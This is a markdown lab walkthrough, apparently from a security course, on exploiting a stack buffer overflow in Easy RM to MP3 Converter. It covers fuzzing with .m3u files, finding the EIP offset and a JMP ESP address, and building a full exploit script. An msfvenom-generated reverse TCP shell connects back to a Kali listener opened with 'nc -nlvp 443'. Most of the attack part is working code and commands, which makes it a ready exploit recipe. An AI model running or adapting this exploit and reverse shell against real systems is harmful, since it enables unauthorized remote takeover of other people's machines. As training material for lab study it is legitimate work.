# Content

- [Content](#content)
  - [Exploiting Easy RM to MP3 Converter on Windows with ASLR](#exploiting-easy-rm-to-mp3-converter-on-windows-with-aslr)
    - [Link lab](#link-lab)
      - [Purpose](#purpose)
    - [The way to do](#the-way-to-do)
      - [Installing the Vulnerable Application](#installing-the-vulnerable-application)
      - [Fuzzing: Length 10,000](#fuzzing-length-10000)
      - [Copying the File from Kali to Windows](#copying-the-file-from-kali-to-windows)
      - [Opening the Attack File: Length 10,000](#opening-the-attack-file-length-10000)
      - [Fuzzing: Lengths 20,000 and 30,000](#fuzzing-lengths-20000-and-30000)
      - [Opening the Attack File: Length 20,000](#opening-the-attack-file-length-20000)
      - [Opening the Attack File: Length 30,000](#opening-the-attack-file-length-30000)
      - [Observing the Crash in the Immunity Debugger](#observing-the-crash-in-the-immunity-debugger)
      - [Restarting Immunity and "Easy RM to MP3 Converter"](#restarting-immunity-and-easy-rm-to-mp3-converter)
      - [Creating a Nonrepeating Pattern of Characters](#creating-a-nonrepeating-pattern-of-characters)
      - [Inserting the Nonrepeating Pattern in an Attack](#inserting-the-nonrepeating-pattern-in-an-attack)
      - [Targeting the EIP Precisely](#targeting-the-eip-precisely)
      - [Examining Memory at ESP](#examining-memory-at-esp)
      - [Listing Modules with Mona](#listing-modules-with-mona)
      - [Finding a JMP ESP](#finding-a-jmp-esp)
      - [Testing Code Execution](#testing-code-execution)
      - [Generating Exploit Code](#generating-exploit-code)
      - [Completing the Attack Code](#completing-the-attack-code)
      - [Starting a Listener](#starting-a-listener)

  
## Exploiting Easy RM to MP3 Converter on Windows with ASLR

### Link lab[](https://samsclass.info/127/proj/ED318.htm)

#### Purpose

- Learn how to exploit a simple buffer overflow vulnerability to gain Remote Code Execution on Windows, defeating Address Space Layout Randomization.
- We will use these tools.
  - Basic Python scripting.
  - Immunity Debugger.
  - MONA plug-in for Immunity.
  - Metasploit Framework.

### The way to do 

#### Installing the Vulnerable Application

- On your Windows machine, in a Web brower, go to
http://www.exploit-db.com/exploits/10374/.
- Click the icon to the right of the label "Dowload Vulnerable App", as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/1.png)
- The software downloads, with a long name starting with 707. Install the software with its default options. The program launches as shown below.
- After a few seconds, a "Preferences" box appears, as shown below.
- Click OK.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/2.png)

#### Fuzzing: Length 10,000

- We'll make a fuzzer that creates an attack file.
- On your Kali Linux machine, in a Terminal window, execute this command.
  ```bash
  nano ezm-fuzz1

  #!/usr/bin/python
  attack = 'A' * 10000
  print attack
  ```
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/3.png)
- Next you need to make the program executable. To do that, in Kali Linux, in a Terminal window, execute this command.
  ```bash
  chmod a+x ezm-fuzz1
  ```
- In the Terminal window, execute this command to run the program, and put the output into a file named ezm-fuzz1.m3u.
  ```bash
  ./ezm-fuzz1 > ezm-fuzz1.m3u
  ```
- In the Terminal window, execute this command to see the files you just created (note the command is "LS -L EZM*" all in lowercase; it does not contain any numeral 1characters).
  ```bash
  ls -l ezm*
  ```
- You should see a file named ezm-fuzz1.m3u with a size of 10001, as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/4.png)
- In the Terminal window, execute this command to see the attack file.
  ```bash
  nano ezm-fuzz1.m3u
  ```
- The file contains a long line of "A" characters, as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/5.png)

#### Copying the File from Kali to Windows

  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/6.png)

#### Opening the Attack File: Length 10,000

- On your Windows machine, in the "Easy RM to MP3 Converter" box, click Load.
- In the Open box, at the top, in the "Look in" drop-down list box, select Desktop.
- At the bottom, in the "Files of type" drop-down list box, select "Playlist Files".
- Double-click the ezm-fuzz1.m3u file, as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/7.png)
- An error message appears, as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/8.png)
- The program did not crash. It's still processing instructions as the designer intended, so this attack failed.
- In the error box, click OK.
- The program now shows a "AAAAAAAAAAA" message, as shown below.
- To get rid of that, close "Easy RM to MP3 Converter" and re-open it from the Start button.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/9.png)

#### Fuzzing: Lengths 20,000 and 30,000

- In the Terminal window, execute these commands to copy your fuzzer twice.
  ```bash
  cp ezm-fuzz1 ezm-fuzz2
  cp ezm-fuzz1 ezm-fuzz3
  ```
- In the Terminal window, execute this command to edit your ezm-fuzz2 file.
  ```bash
  nano ezm-fuzz2
  ```
- Change the length in the file from 10000 to 20000, as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/10.png)
- In the Terminal window, execute this command to run the program, and put the output into a file named ezm-fuzz2.m3u.
  ```bash
  ./ezm-fuzz2 > ezm-fuzz2.m3u
  ```
- In the Terminal window, execute this command to copy the attack file to your Kali desktop.
  ```bash
  cp ezm-fuzz2.m3u ~/Desktop
  ```
- Repeat the steps above to modify ezm-fuzz3 to use a length of 30000, create an attack file named ezm-fuzz3.m3u, and copy it to your Kali desktop.
- In the Terminal window, execute this command
  ```bash
  ls -l ezm*
  ```
- You should see three .m3u files, with lengths of 10001, 20001, and 30001, as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/11.png)
- Drag the ezm-fuzz2.m3u and ezm-fuzz3.m3u files from your Kali Desktop to your Windows target machine.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/12.png)

#### Opening the Attack File: Length 20,000

- On your Windows machine, in "Easy RM to MP3 Converter", open the ezm-fuzz2.m3u file.
- The same error message appears, as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/13.png)
- Once again, the program did not crash.
- Close the error message. Close "Easy RM to MP3 Converter". Launch "Easy RM to MP3 Converter" again from the Start button.

#### Opening the Attack File: Length 30,000

- On your Windows machine, in "Easy RM to MP3 Converter", open the ezm-fuzz3.m3u file.
- It don't show anything and stop working.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/14.png)
- This is more promising--the application encountered an error it could not handle.
- In the error message, click "Close the program".

#### Observing the Crash in the Immunity Debugger

- Launch Immunity with Administrator privileges.
- In Immunity, click File, Open.
- Navigate to
  ```bash
  C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe
  ```
- When the panes fill with text, click the magenta Run button.
- "Easy RM to MP2 Converter" opens in Immunity, as shown below. It may not pop to the front--you may have to click its icon on the Taskbar and click OK.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/15.png)
- In "Easy RM to MP3 Converter", open the ezm-fuzz3.m3u file.
In Immunity, at the bottom left, you see "Access violation when executing [41414141]", as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/16.png)
- This is what we needed--a classic buffer overflow. Some of the "A" characters ended up in the EIP, as the address of the next instruction to be executed, so we have a wayto take control of the computer.

#### Restarting Immunity and "Easy RM to MP3 Converter"

- Close Immunity.
- Launch Immunity with Administrator privileges.
- In Immunity, click File. In the lower section, click item 1: "C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe", as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/17.png)
- Click the Run button.

#### Creating a Nonrepeating Pattern of Characters

- We know that the four bytes that end up in the EIP are somewhere between 20,000 and 30,000 characters into the file.
- So we need to send 20,000 'A' characters followed by a series of 2,500 nonrepeating groups of four characters.
- A simple way to do that is to start with a letter from A to Y, repeated twice, and then use two digits from 00 to 99, like this (spaces added for clarity).
  ```bash
  AA00 AA01 AA02 ... AA98 AA99 
  BB00 BB01 BB02 ... BB98 BB99 
  ...
  PP00 ... PP22 PP23 ... PP99 
  ...
  YY00 YY01 YY02 ... YY98 YY99
  ``` 
- On your Kali Linux machine, in a Terminal window, execute this command
  ```bash
  nano ezm-eip0
  ```
- In the nano window, type or paste this code.
  ```python
  #!/usr/bin/python
  chars = ''
  for a in range(0x41, 0x5A):
    for i in range(0x30, 0x3A):
      for j in range(0x30, 0x3A):
        chars += chr(a) + chr(a) + chr(i) + chr(j)
  print chars
  ```
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/18.png)
- Next you need to make the program executable. To do that, in Kali Linux, in a Terminal window, execute this command.
  ```bash
  chmod a+x ezm-eip0
  ```
- On your Kali Linux machine, in a Terminal window, execute this command
  ```bash
  ./ezm-eip0
  ``` 
- A lot of text scrolls by, ending with the groups starting with YY, as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/19.png)

#### Inserting the Nonrepeating Pattern in an Attack

- On your Kali Linux machine, in a Terminal window, execute this command.
  ```bash
  nano ezm-eip1
  ```
- In the nano window, type or paste this code.
  ```python
  #!/usr/bin/python
  prefix = 'A' * 20000
  chars = ''
  for a in range(0x41, 0x5A):
    for i in range(0x30, 0x3A):
      for j in range(0x30, 0x3A):
        chars += chr(a) + chr(a) + chr(i) + chr(j)
  attack = prefix + chars
  print attack
  ```
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/20.png)
- On your Kali Linux machine, in a Terminal window, execute these commands.
  ```bash
  chmod a+x ezm-eip1
  ./ezm-eip1 > ezm-eip1.m3u
  cp ezm-eip1.m3u ~/Desktop
  ```
- Drag the ezm-eip1.m3u file to your Windows machine and open it in "Easy RM to MP3 Converter". If you are using a client version of Windows, the lower left corner of the Immunity window now says "Access violation when executing [31505038]", as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/21.png)
- Use the chart below to convert these characters to ASCII.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/22.png)
- The characters are '1PP8'. They are in reverse order, technically, but it makes no difference in this case.
- Those bytes appear here.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/23.png)
- Each row has 100 four-byte sequences; a total of 400 bytes.
- P is the 16th letter of the alphabet, so there are 15 complete rows before '1PP8'.
- So the total number of bytes before '1PP8' is.
  ```bash
  15*400 + 18*4 + 2
  ```

#### Targeting the EIP Precisely

- Let's make sure we can hit the EIP.
- On your Kali Linux machine, in a Terminal window, execute this command.
  ```bash
  nano ezm-eip2
  ```
- In the nano window, type or paste this code.
  ```python
  #!/usr/bin/python
  prefix = 'A' * (20000 + 15*400 + 18*4 + 3)
  eip = 'BCDE'
  padding = 'F' * (30000 - len(prefix) - 4)
  attack = prefix + eip + padding
  print attack
  ```
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/24.png)
- On your Kali Linux machine, in a Terminal window, execute these commands.
  ```bash
  chmod a+x ezm-eip2
  ./ezm-eip2 > ezm-eip2.m3u
  cp ezm-eip2.m3u ~/Desktop
  ```
- Drag the ezm-eip2.m3u file to your Windows machine and open it in "Easy RM to MP3 Converter". The lower left corner of the Immunity window now says.
  ```bash
  Accessviolation when executing [45444342]
  ```
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/25.png)
- It worked! The EIP is now 'EDCB', the four bytes I inserted there, in reverse order.

#### Examining Memory at ESP

- Let's see what ended up at the location pointed to by ESP.
- In the upper right pane of Immunity, left-click the value to the right of ESP, so it's highlighted in blue, as shown below.
- Then right-click the highlighted value and click "Follow in Dump".
- Look in the lower left pane of Immunity. It's full of the 'F' characters we put at the end of the exploit text.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/26.png)
- But are there 'F' characters before ESP? To find out, scroll the lower left pane up one row.
- Now you can see that there are only four 'F' characters before the ESP, as shown below
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/27.png)
- So we can put our shellcode immediately after the first 4 'F' characters

#### Listing Modules with Mona

- In Immunity, at the bottom, there is a white bar. Click in that bar and type this command, followed by the Enter key.
  ```bash
  !mona modules
  ```
- There are a lot of modules available now, about two screens full.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/28.png)

#### Finding a JMP ESP

- In Immunity, at the bottom, there is a white bar. Click in that bar and type this command, followed by the Enter key.
  ```bash
  !mona jmp -r esp -m MSRMfilter03.dll
  ```
  - If run command but not show, push down arrow sign and we will list the command we run already. Just press command again.
  ```bash
  !mona modules
  ``` 
- There is one useful address, as shown below.
  ```bash
  0x1001b058 
  ```
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/29.png)

#### Testing Code Execution

- Close Immunity.
- Launch Immunity with Administrator privileges.
- In Immunity, click File. In the lower section, click item 1: "C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe".
- Click the Run button.
- Let's make sure we can run the code at the location we plan to inject into EIP.
- Instead of real shellcode, we'll use a 16-byte NOP sled followed by an INT 3 ('\xCC').
- If the code executes properly, it will slide down the NOP sled and halt at the INT 3.
- On your Kali Linux machine, in a Terminal window, execute this command.
  ```bash
  nano ezm-eip4
  ```
- In the nano window, type or paste this code.
  ```bash
  #!/usr/bin/python
  prefix = 'A' * (20000 + 15*400 + 18*4 + 3)
  eip = '\x58\xb0\x01\x10'
  skip4 = 'FFFF'
  nopsled = '\x90' * 16
  int3 = '\xCC'
  padding = 'F' * (30000 - len(prefix) - 4 -4 -16 -1)
  attack = prefix + eip + skip4 + nopsled + int3 + padding
  print attack
  ```
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/30.png)
- On your Kali Linux machine, in a Terminal window, execute these commands.
  ```bash
  chmod a+x ezm-eip4
  ./ezm-eip4 > ezm-eip4.m3u
  cp ezm-eip4.m3u ~/Desktop
  ```
- Drag the ezm-eip4.m3u file to your Windows machine and open it in "Easy RM to MP3 Converter".
- The lower left corner of the Immunity window now says "INT3 command", as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/31.png)
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/32.png)
  
#### Generating Exploit Code

- On your Kali Linux machine, in a Terminal window, execute the command below.
Replace the IP address with the IP address of your Kali Linux machine.
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST="192.168.50.156" LPORT=443 EXITFUNC=thread -e x86/alpha_mixed -f python > ezm-attack2
  ```
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/33.png)
- This command makes an exploit that will connect from the Windows target back to the Kali Linux attacker on port 443 and execute commands from Kali.
- The exploit is output directly into a file named "ezm-attack2" because it's too long to see all at once in a Terminal window.

#### Completing the Attack Code

- On your Kali Linux machine, in a Terminal window, execute the command below.
  ```bash
  nano ezm-attack2
  ```
- The exploit code appears, as shown below.
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/34.png)
- Add these lines to the start of the file, as shown below.
  ```bash
  #!/usr/bin/python
  prefix = 'A' * (20000 + 15*400 + 18*4 + 3)
  eip = '\x58\xb0\x01\x10'
  skip4 = 'FFFF'
  nopsled = '\x90' * 16
  ```
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/35.png)
- Scroll to the bottom of the file.
- Add these lines at the bottom, as shown below.
  ```bash
  padding = 'F' * (30000 - len(prefix) - 4 - 4 - 16 -len(buf))
  attack = prefix + eip + skip4 + nopsled + buf + padding
  print attack
  ```
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/36.png)
- On your Kali Linux machine, in a Terminal window, execute these commands.
  ```bash
  chmod a+x ezm-attack2
  ./ezm-attack2 > ezm-attack2.m3u
  cp ezm-attack2.m3u ~/Desktop
  ```
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/37.png)

#### Starting a Listener

- On your Kali Linux machine, in a Terminal window, execute this command.
  ```bash
  nc -nlvp 443
  ```
- Drag the ezm-attack2.m3u file to your Windows machine.
- Open "Easy RM to MP3 Converter" from the Start button. You don't need to use Immunity.
- In "Easy RM to MP3 Converter", open the ezm-attack.m3u file.
- I will see a Windows command prompt in Kali--now you own the Windows box!
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/38.png)
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/39.png)
  ![Picture](../11.%20Windows%20Buffer%20Overflows/Image/40.png)